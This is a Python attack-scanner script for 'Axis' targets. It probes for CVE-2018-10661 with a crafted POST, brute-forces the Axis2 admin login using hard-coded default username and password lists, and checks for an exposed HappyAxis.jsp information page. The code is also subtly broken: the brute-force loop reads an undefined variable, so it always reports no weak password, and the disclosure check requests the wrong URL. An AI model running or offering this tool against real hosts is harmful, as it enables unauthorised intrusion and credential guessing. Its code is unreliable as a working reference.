#coding=utf-8
import requests
from user_agent import get_user_agent
def CVE_2018_10661(url):
    try:
        headers = {'User-Agent': get_user_agent()}
        data = {"action": "abc", "return_page": "it_worked"}
        url = url.rstrip("/") + "/index.html/a.srv"
        s = requests.post(url=url, data=data, headers=headers)
        if "it_worked" in s.text:
            return "exist CVE_2018_10661"
        else:
            return "not exist CVE_2018_10661"
    except Exception:
        return "not exist CVE_2018_10661"
def axis_admin(host):
    try:
        url = "http://%s" % (host)
        headers = {'User-Agent': get_user_agent()}
        error_i = 0
        flag_list = ['Administration Page</title>', 'System Components', 'axis2-admin/upload',
                     'include page="footer.inc">', 'axis2-admin/logout']
        user_list = ['axis', 'admin', 'manager', 'root']
        pass_list = ['', 'axis', 'axis2', '123456', '12345678', 'password', '123456789', 'admin123', 'admin888',
                     'admin1', 'administrator', '8888888', '123123', 'admin', 'manager', 'root']
        for user in user_list:
            for password in pass_list:
                try:
                    login_url = url + '/axis2/axis2-admin/login'
                    PostStr = 'userName=%s&password=%s&submit=+Login+' % (user, password)
                    request = requests.post(url=login_url, data=PostStr, headers=headers)
                    res_html = res.text
                except Exception:
                    return 'axis no weak password。'
                for flag in flag_list:
                    if flag in res_html:
                        info = '%s Axis Weak password %s:%s' % (login_url, user, password)
                        return 'YES|' + info
        return 'axis no weak password。'
    except Exception:
        return 'axis no weak password。'

def axis_info(host):
    try:
        url = "http://%s" % (host)
        headers = {'User-Agent': get_user_agent()}
        vul_url = url + "/axis2/axis2-web/HappyAxis.jsp"
        try:
            s = requests.get(url=url, headers=headers)
            res_html = s.text
        except Exception:
            return 'no axis info。'
        if "Axis2 Happiness Page" in res_html:
            info = vul_url + " Axis Information Disclosure"
            return 'YES|' + info
        return 'no axis info。'
    except Exception:
        return 'no axis info。'
def axis(url):
    cve__2018_10661=CVE_2018_10661(url)
    print(cve__2018_10661)
    axis_admins=axis_admin(url)
    print(axis_admins)
    axis_infos=axis_info(url)
    print(axis_infos)


